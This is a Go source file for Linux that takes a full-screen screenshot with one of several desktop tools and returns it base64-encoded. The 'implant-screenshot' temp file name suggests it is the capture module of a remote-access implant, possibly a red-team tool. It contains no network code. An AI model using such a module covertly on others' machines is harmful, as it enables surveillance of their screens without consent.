//go:build linux

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func init() {

	takeScreenshot = linuxTakeScreenshot
}

type linuxScreenshotUtility struct {
	name         string
	cmd          string
	argsToStdout []string
	argsToFile   []string
}

var linuxScreenshotUtilities = []linuxScreenshotUtility{
	{
		name:         "grim (Wayland)",
		cmd:          "grim",
		argsToStdout: []string{"-t", "png", "-"},
	},
	{
		name:         "maim (X11)",
		cmd:          "maim",
		argsToStdout: []string{"-f", "png"},
	},
	{
		name:         "import (ImageMagick, X11)",
		cmd:          "import",
		argsToStdout: []string{"-window", "root", "png:-"},
		argsToFile:   []string{"-window", "root"},
	},
	{
		name: "scrot (X11)",
		cmd:  "scrot",

		argsToStdout: []string{"-o", "-z", "/dev/stdout"},

		argsToFile: []string{"-o", "-z"},
	},
	{
		name:       "gnome-screenshot (GNOME Session)",
		cmd:        "gnome-screenshot",
		argsToFile: []string{"-f"},
	},
	{
		name:       "spectacle (KDE Session)",
		cmd:        "spectacle",
		argsToFile: []string{"--fullscreen", "--batch", "--output"},
	},
}

func linuxTakeScreenshot() (string, error) {
	var lastErr error

	for _, util := range linuxScreenshotUtilities {
		cmdPath, err := exec.LookPath(util.cmd)
		if err != nil {

			lastErr = fmt.Errorf("utility %s not found in PATH: %w", util.cmd, err)
			continue
		}

		if len(util.argsToStdout) > 0 {
			cmd := exec.Command(cmdPath, util.argsToStdout...)
			var outBuffer bytes.Buffer
			var errBuffer bytes.Buffer
			cmd.Stdout = &outBuffer
			cmd.Stderr = &errBuffer
			cmd.Env = os.Environ()

			err := cmd.Run()
			if err == nil && outBuffer.Len() > 0 {

				return base64.StdEncoding.EncodeToString(outBuffer.Bytes()), nil
			}

			errMsg := ""
			if err != nil {
				errMsg = err.Error()
			}
			stderrStr := strings.TrimSpace(errBuffer.String())
			if stderrStr != "" {
				errMsg = fmt.Sprintf("%s (stderr: %s)", errMsg, stderrStr)
			}
			if err != nil {
				lastErr = fmt.Errorf("failed executing %s (stdout method): %s", util.name, errMsg)
			} else if outBuffer.Len() == 0 {
				lastErr = fmt.Errorf("%s (stdout method) produced no output; %s", util.name, errMsg)
			}

		}

		if len(util.argsToFile) > 0 {
			tmpFile, err := os.CreateTemp("", "implant-screenshot-*.png")
			if err != nil {
				lastErr = fmt.Errorf("failed to create temp file for %s: %w", util.name, err)
				continue
			}
			tmpFileName := tmpFile.Name()
			tmpFile.Close()

			defer func(path string) { os.Remove(path) }(tmpFileName)

			fullArgs := append(util.argsToFile, tmpFileName)
			cmd := exec.Command(cmdPath, fullArgs...)
			var errBuffer bytes.Buffer
			cmd.Stderr = &errBuffer
			cmd.Env = os.Environ()

			err = cmd.Run()
			if err == nil {
				imgBytes, readErr := os.ReadFile(tmpFileName)
				if readErr != nil {
					lastErr = fmt.Errorf("failed to read temp screenshot file %s for %s: %w", tmpFileName, util.name, readErr)
					os.Remove(tmpFileName)
					continue
				}
				os.Remove(tmpFileName)
				if len(imgBytes) > 0 {
					return base64.StdEncoding.EncodeToString(imgBytes), nil
				}
				lastErr = fmt.Errorf("temp screenshot file %s for %s was empty; stderr: %s", tmpFileName, util.name, errBuffer.String())
				continue
			}

			errMsg := err.Error()
			stderrStr := strings.TrimSpace(errBuffer.String())
			if stderrStr != "" {
				errMsg = fmt.Sprintf("%s (stderr: %s)", errMsg, stderrStr)
			}
			lastErr = fmt.Errorf("failed executing %s (file method): %s", util.name, errMsg)
			os.Remove(tmpFileName)
		}
	}

	if lastErr != nil {
		return "", fmt.Errorf("all screenshot attempts failed on Linux. Last error: %w", lastErr)
	}
	return "", fmt.Errorf("no suitable screenshot utility found or all configured attempts failed on Linux")
}
